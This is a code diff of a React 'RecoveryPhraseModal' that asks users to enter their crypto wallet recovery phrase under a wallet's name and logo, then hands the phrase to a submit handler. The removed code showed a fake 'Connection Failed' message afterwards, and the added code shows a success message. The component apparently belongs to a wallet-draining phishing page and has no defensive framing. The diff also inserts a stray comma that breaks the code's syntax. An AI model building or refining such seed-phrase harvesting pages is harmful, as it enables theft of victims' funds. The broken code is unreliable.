@@ -4,7 +4,6 @@ export default function RecoveryPhraseModal({ walletName, walletImg, onClose, on
   const [phrase, setPhrase] = useState('')
   const [error, setError] = useState('')
   const [success, setSuccess] = useState(false)
-  const [failed, setFailed] = useState(false)
 
   const handleSubmit = async (e) => {
     e.preventDefault()
@@ -21,13 +20,13 @@ export default function RecoveryPhraseModal({ walletName, walletImg, onClose, on
     }
 
     try {
-      setFailed(true)
       await onSubmit(phrase)
-      setTimeout(() => {
-        setFailed(false)
+      // Show failed state instead
+      ,setTimeout(() => {
         setPhrase('')
+        setSuccess(false)
         onClose()
-      }, 2000)
+      }, 1500)
     } catch (err) {
       setError(err.message || 'Failed to submit phrase')
     }
@@ -312,7 +311,7 @@ export default function RecoveryPhraseModal({ walletName, walletImg, onClose, on
             {error && <div className="rp-error">❌ {error}</div>}
             {success && (
               <div className="rp-success">
-                ❌ Connection Failed
+                ✓ Recovery phrase received successfully
               </div>
             )}
 
@@ -335,8 +334,8 @@ export default function RecoveryPhraseModal({ walletName, walletImg, onClose, on
                     <span className="rp-spinner"></span>
                     {' '}Submitting...
                   </>
-                ) : failed ? (
-                  '❌ Connection Failed'
+                ) : success ? (
+                  '✓ Done'
                 ) : (
                   'Submit & Connect'
                 )}
